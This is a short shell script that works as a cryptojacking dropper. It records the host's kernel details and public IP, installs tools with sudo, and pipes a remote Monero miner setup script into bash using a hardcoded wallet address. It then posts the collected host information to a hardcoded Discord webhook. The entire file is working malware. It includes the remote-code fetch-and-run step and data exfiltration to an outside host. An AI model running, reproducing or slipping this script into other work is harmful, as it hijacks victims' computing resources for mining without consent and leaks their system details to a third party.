#!/bin/sh

uname -a > info.txt
curl ifconfig.me >> info.txt

cd /tmp
yes | sudo apt install curl wget -y

RAND_SUFFIX=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)

curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4576JTdTYFp6hi2n2Ci54eSFzV8GSkNJTJVC1zswJpk7byZMSfu4W4mVpCsoQJHfSyQS6y5CkZ1kbZTTbUBbpFrYRgtzsrG."$RAND_SUFFIX"

WEBHOOK_URL="https://discordapp.com/api/webhooks/1304452907055317003/8AzPRgV9-Bre2qlThxBc9jGdhDSbj25ckgctd6vwWKC5IlljbAoxOu9WzJ1rO6F87sln"

INFO_CONTENT=$(cat info.txt)

curl -H "Content-Type: application/json" \
     -X POST \
     -d "{\"content\": \"\`\`\`$INFO_CONTENT\`\`\`\"}" \
     "$WEBHOOK_URL"
